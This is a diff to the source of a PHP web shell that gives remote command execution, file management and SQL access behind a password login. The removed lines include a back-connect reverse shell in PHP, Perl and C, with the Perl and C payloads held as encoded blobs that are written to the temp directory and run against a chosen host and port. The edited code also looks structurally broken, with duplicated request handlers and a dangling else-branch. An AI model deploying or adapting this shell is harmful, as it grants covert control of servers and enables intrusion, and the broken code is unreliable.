-				case 'mssql': if (function_exists('sqlsrv_rows_affected')) { return sqlsrv_rows_affected($result); } elseif (function_exists('mssql_rows_affected')) { return mssql_rows_affected($this->connection); } break;
-				case 'oracle': return oci_num_rows($result);
-				case 'odbc': return odbc_num_rows($result);
-				case 'pdo': return $result->rowCount();
-				default: throw new Exception("affectedRows not supported for database type: $this->dbType");
-			}
-		} catch (Exception $e) {
-			throw $e;
-		}
-	}
-    public function fetchRow($result) {
-		try {
-			switch ($this->dbType) {
-				case 'mysql': return $result->fetch_assoc(); break;
-				case 'pgsql': return pg_fetch_assoc($result); break;
-				case 'sqlite3': return $result->fetchArray(SQLITE3_ASSOC); break;
-				case 'sqlite': return sqlite_fetch_array($result, SQLITE_ASSOC); break;
-				case 'mssql': return sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC); break;
-				case 'oracle': return oci_fetch_assoc($result); break;
-				case 'odbc': return odbc_fetch_array($result); break;
-				case 'pdo': return $result->fetch(PDO::FETCH_ASSOC); break;
-				default: throw new Exception("fetchRow not supported for database type: $this->dbType");
-			}
-		} catch (Exception $e) {
-			throw $e;
-		} 
+
+    public function query($sql, $params = []) {
+        if (!$this->connection) {
+            return false;
+        }
+        try {
+            // Use prepared statements to prevent SQL injection
+            $stmt = $this->connection->prepare($sql);
+            if ($stmt === false) {
+                throw new Exception("Prepare failed: " . $this->connection->error);
+            }
+            if (!empty($params)) {
+                $types = str_repeat('s', count($params)); // Assume all params are strings
+                $stmt->bind_param($types, ...$params);
+            }
+            $stmt->execute();
+            return $stmt->get_result();
+        } catch (Exception $e) {
+            // Handle exceptions
+            return false;
+        }
     }
-	public function numRows($result) {
-		try {
-			switch ($this->dbType) {
-				case 'mysql': return $result->num_rows;
-				case 'pgsql': return pg_num_rows($result);
-				case 'sqlite3': return $result->numColumns();
-				case 'sqlite':  return sqlite_num_rows($result);
-				case 'mssql': return sqlsrv_num_rows($result);
-				case 'oracle': throw new Exception("numRows not directly supported for Oracle. Use a COUNT query instead."); 
-				case 'odbc': return odbc_num_rows($result);
-				case 'pdo': return $result->rowCount();
-				default: throw new Exception("numRows not supported for database type: $this->dbType");
-			}
-		} catch (Exception $e) {
-			throw $e;
-		} 
-	}	
-	public function query($query) {
-		try {
-			switch ($this->dbType) {
-				case 'mysql':
-					if (class_exists('mysqli')) {
-						$result = $this->connection->query($query);
-						if ($result === false) {throw new Exception("MySQL query failed: " . $this->connection->error);}
-						return $result;
-					} elseif (function_exists('mysql_query')) {
-						$result = mysql_query($query, $this->connection);
-						if ($result === false) {throw new Exception("MySQL query failed: " . mysql_error($this->connection));}
-						return $result;
-					}
-				case 'pgsql':
-					$result = pg_query($this->connection, $query);
-					if ($result === false) {throw new Exception("PostgreSQL query failed: " . pg_last_error($this->connection));}
-					return $result;
-				case 'sqlite3':
-					$result = $this->connection->query($query);
-					if ($result === false) {throw new Exception("SQLite3 query failed: " . $this->connection->lastErrorMsg());}
-					return $result;
-				case 'sqlite':
-					$result = sqlite_query($this->connection, $query);
-					if ($result === false) {throw new Exception("SQLite query failed: " . sqlite_error_string(sqlite_last_error($this->connection)));}
-					return $result;
-				case 'mssql':
-					if (function_exists('sqlsrv_query')) {
-						$result = sqlsrv_query($this->connection, $query);
-						if ($result === false) {throw new Exception("MSSQL query failed: " . print_r(sqlsrv_errors(), true));}
-						return $result;
-					} elseif (function_exists('mssql_query')) {
-						$result = mssql_query($query, $this->connection);
-						if ($result === false) {throw new Exception("MSSQL query failed.");}
-						return $result;
-					}
-				case 'oracle':
-					$stmt = oci_parse($this->connection, $query);
-					if (!$stmt) {throw new Exception("Oracle query parsing failed.");}
-					if (!oci_execute($stmt)) {
-						$error = oci_error($stmt);
-						throw new Exception("Oracle query execution failed: " . $error['message']);
-					}
-					return $stmt;
-				case 'odbc':
-					$result = odbc_exec($this->connection, $query);
-					if ($result === false) {throw new Exception("ODBC query failed: " . odbc_errormsg($this->connection));}
-					return $result;
-				case 'pdo':
-					$result = $this->connection->query($query);
-					if ($result === false) {throw new Exception("PDO query failed: " . implode(", ", $this->connection->errorInfo()));}
-					return $result;
-				default: throw new Exception("Query not supported for database type: $this->dbType");
-			}
-		} catch (Exception $e) {
-			throw $e;
-		}
-	}
+
     public function close() {
-        switch ($this->dbType) {
-            case 'mysql': return class_exists('mysqli') ? $this->connection->close() : mysql_close($this->connection); break;
-            case 'pgsql': return pg_close($this->connection); break;
-            case 'sqlite3': return $this->connection->close(); break;
-            case 'sqlite': return sqlite_close($this->connection); break;
-            case 'mssql': return function_exists('sqlsrv_close') ? sqlsrv_close($this->connection) : mssql_close($this->connection); break;
-            case 'oracle': return oci_close($this->connection); break;
-            case 'odbc': return odbc_close($this->connection); break;
-            case 'pdo': $this->connection = null; break;
-			default: throw new Exception("close not supported for database type: $this->dbType");
+        if ($this->connection) {
+            $this->connection->close();
         }
     }
 }
+if (isset($_GET['act'])) {
+    $action = $_GET['act'];
+    $response = [];
+
+    switch ($action) {
+        case 'info':
+            $response = serverSecInfo();
+            break;
+
+        case 'command':
+            if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
+                $sendreq = perintahnya($_POST['cmd'], $_POST['xpath']);
+                $response['stdout'] = base64_encode("<pre class='pb-0 mb-0'>" . htmlspecialchars(base64_decode($sendreq['userhost'])) . ":<span class='text-cyan font-weight-bold'>" . htmlspecialchars(base64_decode($sendreq['path'])) . "</span><span class='text-warning font-weight-bold'>#</span> " . htmlspecialchars($_POST['cmd']) . "<br/>" . htmlspecialchars(base64_decode($sendreq['stdout'])) . "</pre>");
+                $response['path'] = $sendreq['path'];
+                $response['userhost'] = $sendreq['userhost'];
+            } else {
+                $response['stdout'] = base64_encode("<pre class='pb-0 mb-0'>Invalid command.</pre>");
+                $response['path'] = base64_encode($_SESSION['path']);
+                $response['userhost'] = base64_encode('0');
+            }
+            break;
+
+        // ... other cases
+    }
+
+    if (!empty($response)) {
+        header("Content-type: application/json; charset=utf-8");
+        echo json_encode($response);
+        die();
+    }
+}
+
 if(isset($_GET['act'])){
-	if($_GET['act'] == 'info'){
-		header("Content-type: application/json; charset=utf-8");
-		echo json_encode((object) serverSecInfo());
-		die();
-	} else if($_GET['act'] == 'command'){
-		if(isset($_POST['cmd'])){
-			if(!empty($_POST['cmd']) || strlen($_POST['cmd'])>1){
-				$sendreq = perintahnya($_POST['cmd'], $_POST['xpath']);
-				$outs['stdout'] = base64_encode("<pre class='pb-0 mb-0'>". @iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("<span class='text-success font-weight-bold'>".base64_decode($sendreq['userhost']).":</span><span class='text-cyan font-weight-bold'>".base64_decode($sendreq['path'])."</span><span class='text-warning font-weight-bold'>#</span> {$_POST['cmd']}<br/>".htmlspecialchars(base64_decode($sendreq['stdout']))."","\t\0"))."</pre>");
-				$outs['path'] = $sendreq['path'];
-				$outs['userhost'] = $sendreq['userhost'];
-			} else {
-				$outs['stdout'] = base64_encode("<pre class='pb-0 mb-0'>Sebenernya, apa sih yang anda perintahkan?</pre>");
-				$outs['path'] = base64_encode($_SESSION['path']);
-				$outs['userhost'] = base64_encode('0');
-			}
-			header("Content-type: application/json; charset=utf-8");
-			echo json_encode($outs);
-			clearstatcache();
-			die();
-		}
-	} else if($_GET['act'] == 'mkdir'){
+	if($_GET['act'] == 'mkdir'){
 		$ndir = isset($_POST['xdir']) && !empty($_POST['xdir']) ? $_POST['xdir'] : '';
 		if(!empty($ndir)){
 			$xpath = $_POST['xpath']."/".$ndir;
@@ -1554,84 +1450,7 @@ if(isset($_GET['act'])){
 			}
 		}
 		die();
-	} else if($_GET['act'] == 'bc'){
-		$outs = '';
-		if(isset($_POST['xpath'], $_POST['bhost'], $_POST['bport'], $_POST['btype'])){
-			function which($p,$path){
-				$d = perintahnya('which ' . $p, $path);
-				if(!empty($d['stdout'])){return $d['stdout'];}
-				return false;
-			}
-			if($_POST['btype'] == 1){
-				if(AvFunc(array('fsockopen','fputs','feof','fgets','fclose'))){
-					$sockfd = @fsockopen($_POST['bhost'], $_POST['bport'], $errno, $errstr);
-					$out = "";
-					if($errno != 0) {
-						$out .= "{$errno} : {$errstr}";
-					} else if (!$sockfd) {
-						$out .= "Unexpected error has occured, connection may have failed.";
-					} else {
-						fputs($sockfd, "yoshh.. Connected!\n");
-						while(!feof($sockfd)) {
-							$cmdPrompt = '[$]~ ';
-							fputs($sockfd, $cmdPrompt);
-							$command = fgets($sockfd, $GLOBALS['chunk_size']);
-							fputs($sockfd, "".perintahnya($command, $_POST['xpath'])['stdout']."");
-						}
-						$out .= $sockfd;
-						fclose($sockfd);
-					}
-					$outs .= $out;
-				} else {
-					$outs = 'reverse shell using php: failed!';
-				}
-			} else if($_POST['btype'] == 2){
-				$tmpdir = str_replace('\\','/', @sys_get_temp_dir());
-				if(is_writable($tmpdir)){
-					$bcfile = $tmpdir."/bc.pl";
-					$cf = cf($bcfile, generate("decode", "cjNpMnEybjRyNGw0dTJqNWQ0ZTRuMnY1NjR6NWM0djFuMXE0MDZjNHAzdDNrNDc0czViNHM0ODM0M28xYzJiNGk1aTU1NHY1MzNwNWo0bDUwNjg0NDRtNG40aDRuMnQzOTNtM2IzNTV3MzU0eDNuMjkyeDQ5NmYybDVmNGE0azJyM2YzcTRyNHU1azR5MmEydDNuM3gzcjVjMngzNDM1MzIzbDJqNDM0YzQ3NHA0aTRuNGY0MzRxNTI0bDU0NG80MDRlNHY1bjJ0M2IzcjNmMzc1MTR4MjY0ejNhMmMyYjRpNWk1NTR2NWoybzN4NDg2bzNkNGM0NzRvMmQyZzN6NW00ZjRpNGQ0OTJ0MzkyMjRmNGYyeTM2MzYzczFoMms0ejVsNHM0bzRnNDk0NTRtNHg1dzVnNHg1aDRpNXU0dTVoNW00ODRpMm4ybjRhNHg1ajJoMnoyNDNuMTA2ZjQ5NGM0YTQxNm4yNDVwM2MzajNxNHUzczJoMno0YzN6M2YzejRuNHAzeDNhMjM1bzNuNHY0ODRxM3EzdTNjM2MzeTRvMjgyYzJ2NWo0dzVrNGw0aTJkMjk2ejRwM2E0ZTQ5NHgzZzJoM3I0eDVoNGk0MDNwM3EzYTI5NWc0cTNtMmY0NTN2MTY0aDRtNGg0YzRrNW80ZzJuM3k0ODN3NDkzdTNsMmQydDNuNGk1YTQ5NG00eTNlMjA1MTVuMzY0OTQ3NHgzbzNhM3Y1azR2NW40ZTRvM2wyYzJ5M200ZDJvMmc0dDFtMWY0djU2NHY1ZzJ0M3AzZDN1NHAzMTRlMmYyNjN2M3QzcjNnM3U0YjNvM2MyeTNkNHExejJoNHc1YTR1NXczdzNyM2EzcjNzM3YzMTRjMmEyMjN0M28zMDU3M2wzYTN0M3IzbzJnNHYxcjFqNHg1YjRtNHAyMjVxMzgzYjMzNTA1bDJsM2MyaTRqMjM1ejRnM2kzYjN3M2QybzJnNHQxbTFqNDQ2azQxNjU0ajRoMmsyNDQ5NHE1azRzMm40cDVlMnQyaTR1M2oyejJyMTMzaDVkNHM1bDRsNWwyMzU0NWgzZzNrM3AyMjN3MTMzNzRjNGY0eTU2NHgzbjN1MzkzbzM2NXYzeTM1M3UxcTFrNWk0bjRzNGs1aTJuM3EzcDRuNG4zejRqMmY0"));
-					if($cf){
-						if(which('perl')){
-							$out = perintahnya("perl {$bcfile} {$_POST['bhost']} {$_POST['bport']} &", $tmpdir);
-							$outs = $out['stdout']."\n".perintahnya("".generate("decode", "w5s4b234t4r4f296c274i4k5h4p32494n2l4t5")."", $tmpdir)['stdout'];						
-						} else {
-							$outs = 'reverse shell using perl: failed!';						
-						}
-					} else {
-						$outs = 'reverse shell using perl: failed!';
-					}
-				} else {
-					$outs = 'temp directory is not writeable!';					
-				}
-			} else if($_POST['btype'] == 3){
-				$tmpdir = str_replace('\\','/', @sys_get_temp_dir());
-				if(is_writable($tmpdir)){
-					$bcfile = $tmpdir."/bc.c";
-					$cf = cf($bcfile, generate("decode", "cjNpNGg0NTRrNG80YjRtNWMyMDNqNHo1NTRxNWY0czI5NDczNjN0MXMzZjRqNDc0dDVyNGM0ZTRuMzIzajRyNDA2MTRrNHM1NTRyNWE0MDYyNGg0NTNyMXUxZTJnNHY1NzRjNGw0ajU2NHAzMDNrNDY0cDRxNWw0bTVxNHMyZDR2NXMyZzRiMzQzbzE5NGc0MTZtM2U0ZTViNHU1bDJwNXU1dDRiMjM0cTRhNGE0MTRjMjM0ODRnNWo0cDNpMjc0ajRjNDM2MjRlNW4yZDJ2NDYzczFnMmgybjNhMjk0ZzQxNm0zNzRoNTEzNTNyMW8zbzNoMmIybDRzNGw0czRrNW80ODJqNHU1NDRzNTE0YTQ1NG40ZzVnNHY1ZTJvNGQ0djU1M3gxdjFuM2EyODJhMmw1ZjU2NHE1aDR1NWwyNTQwNHgyazIxM3gxcDFmMnAzYzI4Mmo0bzVmNDM0ajRmNGY0NDRuNTg0dTVmNGg0dDRwMzczZzJlM3A0MTRkM2szcTQyNTAzMjNvMW8zZDJvM28zczRjNGc0dTJtNGc0djUzNGc0ZjR4NWw0cDMxM2UyOTRwNHc1bDQwNm0yNjRvNHc1ZjRvMmE0eDU5NG00eDM3NGI1aTJ1MzEzNTNyMW8zbzNoMmIybDRoNGg0dDIwNmQ0ZTR6M2c1NTRsNWk0czJrNDQ0aTViNGw1bzRkMjUzcDNmNG00ZTR6NTE0MTQ2NGw1dzVoMmU1azRuNXI0YjU1NDY0azIxM3gxcDFmMnAzYzI4MjY0ajU5Mmk0ODJwNGc0ODRzNWM0MTZtMmEzZTNnNWozcTNpMzM1bTI4MnAzMDVsNGczYzVwMzQ1cjNwNGw0cTNuMmEybDNuM3IzMzVuM28zajNlNXAzbzRrM24yOTI0MzYzdDFwM2UyZDJjMnE1YzRnMnAydjM1NGY0ZzR2NWo1NDR4NWkybTU5NDA0bzNwMm00bTRxNG80YTQxNmMyajRmNGk1YzRpNTQ0YTRqNGQyejNvMnAzazJvNGQ0djVxMmcyczRvNXM0NTRoNG41dTNrNHg1azQxNjg0MDZvM3M0aTQ1NGo0NDRiNGw1bTRoMmgydzMxMzU0aDJlMnM0dTEzM2YycDNlMmQyYzJwM2UyZzJwNGs1azRpNGg0ejV1M2IyazRoNHU1ajRsNWo1dDRiMjg0OTRjNGo0cjNsMnoycDExMzkycDM4MmUyOTJkMnAzZjJ6NWI0cDRwNHo1azRnMngyZTRyMW0xYTJwM20zOTI2NnIxMjNkMm8zbzNoMjc0bjRvNHQybjJuNTg0azI4MjM0aTJnNHAxczE5MmQycDNmMmw1cjRsNHUyeDNjNGM0dDJuM3IyaDIxMzYzMDM5MmwzYTJvMzk0MTZ3NXoyajI4NGM0bjJmMjc0bDJ6MnAxMTM5MnAzODJlMms0dTQwNnI0bTVqNGwyZTI0NDg0aDRuNDI0bDQ4NGEyMjRuNWIydTMxMzUzcjFvM28zaDJiMjU0azRpNHE0bTVrMjY0NDR3MzAzNjNtMXo0"));
-					if($cf){
-						if(which('gcc')){
-							$out = perintahnya("".generate("decode", "n5c464a2t2i4f244o4d4g42434k582t2l4i4x5u2j594r274")."", $tmpdir);
-							@unlink($bcfile);
-							$out = perintahnya("{$bcfile} {$_POST['bhost']} {$_POST['bport']} &", $tmpdir);
-							$outs = perintahnya("".generate("decode", "w5s4b234t4r4f296c274i4k5h4p32494")."", $tmpdir)['stdout'];
-						} else {
-							$outs = 'reverse shell using C: failed!';
-						}
-					} else {
-						$outs = 'reverse shell using C: failed!';
-					}
-				} else {
-					$outs = 'temp directory is not writeable!';					
-				}
-			} else {
-				$outs = 'method gak tersedia!';
-			}
-		} else {
-			$outs = 'gak bisa di konekin!';
-		}
-		echo $outs;
-		die();
-	} else if($_GET['act'] == 'path'){
+} else if($_GET['act'] == 'path'){
 		$_SESSION['path'] = isset($_GET['dir']) && !empty($_GET['dir']) ? $_GET['dir'] : $_SESSION['path'];
 		if(isset($_GET['opt'], $_GET['entry'])){
 			$df = $_SESSION['path'] .'/'. $_GET['entry'];
@@ -1748,15 +1567,17 @@ if(isset($_GET['act'])){
 	}
 }
 blockCrawler();
-if(isset($_POST['xpass'])){
-	if(password_verify($_POST['xpass'], $auth_pass)){
-		$_SESSION['auth'] = $auth_pass;
-		$_SESSION['path'] = $lokasiberkas;
-		header('location: '.$_SERVER['PHP_SELF']);
-		exit();
-	} else {
-		$statusLogin[] = 'wrong password :(';
-	}
+if (isset($_POST['xpass'])) {
+    if (password_verify($_POST['xpass'], $auth_pass)) {
+        $_SESSION['auth'] = $auth_pass;
+        $_SESSION['path'] = $lokasiberkas;
+        // Regenerate session ID to prevent session fixation
+        session_regenerate_id(true);
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit();
+    } else {
+        $statusLogin[] = 'Wrong password :(';
+    }
 }
 if(!isset($_SESSION['auth'])){
 	echo "<html>
@@ -1821,9 +1642,6 @@ if(!isset($_SESSION['auth'])){
 					<button class="nav-link d-flex justify-content-center align-items-center" data-toggle="tab" data-target="#nav-cmd" type="button" role="tab" aria-controls="nav-cmd" aria-selected="false">
 						<?php echo fType('cmd','1em');?><span class="d-none d-sm-block ml-2">Command</span>
 					</button>
-					<button class="nav-link d-flex justify-content-center align-items-center" data-toggle="tab" data-target="#nav-bc" type="button" role="tab" aria-controls="nav-bc" aria-selected="false">
-						<?php echo fType('bc','1.2em');?><span class="d-none d-sm-block ml-2">Connect</span>
-					</button>
 					<button class="nav-link d-flex justify-content-center align-items-center" data-toggle="tab" data-target="#nav-sql" type="button" role="tab" aria-controls="nav-sql" aria-selected="false">
 						<?php echo fType('sql','1.2em');?><span class="d-none d-sm-block ml-2">Sql</span>
 					</button>
@@ -1872,37 +1690,6 @@ if(!isset($_SESSION['auth'])){
 							</ul>
 						</div>
 					</div>
-				</div>
-				<div class="tab-pane fade" id="nav-bc" role="tabpanel">
-					<div class="row" style="margin-top:-7.5px;"><div class="col-12 mb-2"><span>Back-connect to:</span></div></div>
-					<form method="post" action="?act=bc" id="rqbc">
-						<input type="hidden" name="xpath" value=""/>
-						<div class="form-row">
-							<div class="col-sm-12 col-md-12 col-lg-4 mb-3">
-								<div class="input-group">
-									<div class="input-group-prepend"><label class="input-group-text">Server</label></div>
-									<input type="text" name="bhost" class="form-control form-control-sm border-success" placeholder="127.0.0.1"></input>
-								</div>
-							</div>
-							<div class="col-6 col-lg-4 mb-3">
-								<div class="input-group">
-									<div class="input-group-prepend"><label class="input-group-text">Port</label></div>
-									<input type="text" name="bport" class="form-control form-control-sm border-success" placeholder="1337"></input>
-								</div>
-							</div>
-							<div class="col-6 col-lg-4 mb-3">
-								<div class="input-group">
-									<div class="input-group-prepend"><label class="input-group-text">Using</label></div>
-									<select class="form-control form-control-sm border-success" name="btype">
-										<option value="1">PHP</option>
-										<option value="2" selected>Perl</option>
-										<option value="3">C</option>
-									</select>
-									<div class="input-group-append"><button class="btn btn-outline-success" type="submit">Go</button></div>
-								</div>
-							</div>
-						</div>
-					</form>
 				</div>
 				<div class="tab-pane fade" id="nav-sql" role="tabpanel">
 					<div class="row" style="margin-top:-7.5px;">
